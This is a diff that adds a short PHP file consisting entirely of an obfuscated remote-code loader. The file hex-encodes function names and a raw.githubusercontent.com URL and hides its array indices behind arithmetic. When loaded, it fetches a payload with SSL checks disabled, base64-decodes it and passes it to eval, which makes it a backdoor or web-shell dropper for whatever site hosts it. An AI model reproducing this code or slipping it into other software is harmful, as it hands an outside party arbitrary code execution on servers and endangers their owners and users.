@@ -1,0 +1,33 @@
+<?php
+if(!defined('AAA____A_')) define('AAA____A_', 'AA__A_AA_');
+$GLOBALS[AAA____A_]=explode('|;|@|7','H*|;|@|73F3E|;|@|76261736536345F6465636F6465|;|@|76375726C5F65786563|;|@|7746170|;|@|76375726C5F696E6974|;|@|768747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F786B346E6A75742F70656D62656C616A6172616E2F726566732F68656164732F6D61696E2F6973696E79612E706870|;|@|76375726C5F7365746F70745F6172726179|;|@|74355524C4F50545F52455455524E5452414E53464552|;|@|74355524C4F50545F464F4C4C4F574C4F434154494F4E|;|@|74355524C4F50545F555345524147454E54|;|@|74D6F7A696C6C612F352E30|;|@|74355524C4F50545F53534C5F56455249465950454552|;|@|74355524C4F50545F53534C5F564552494659484F5354');
+unset($�����);$�����;
+eval(
+    pack($GLOBALS[AAA____A_][(5+6+7-18)*0], $GLOBALS[AAA____A_][1]) .
+    base64_decode(
+        curl_exec(
+            tap(
+                curl_init(
+                    call_user_func("pack", $GLOBALS[AAA____A_][100-20*5], $GLOBALS[AAA____A_][(-5633+407+155*34-38)])
+                ),
+                function($LL7KBGG){
+                    curl_setopt_array($LL7KBGG, [
+                        CURLOPT_RETURNTRANSFER => 1,
+                        CURLOPT_FOLLOWLOCATION => 1,
+                        CURLOPT_USERAGENT => call_user_func_array("pack", array($GLOBALS[AAA____A_][15-5+7-17], $GLOBALS[AAA____A_][11])),
+                        CURLOPT_SSL_VERIFYPEER => 0,
+                        CURLOPT_SSL_VERIFYHOST => 0
+                    ]);
+                    unset($���ޔ��); $���ޔ��;
+                }
+            )
+        )
+    )
+);
+function tap($CDu5R46, $FBl18S1){
+    $FBl18S1($CDu5R46);
+    unset($��); $��;
+    return $CDu5R46;
+    unset($։��ᬉ�߆); $։��ᬉ�߆;
+}
+?>
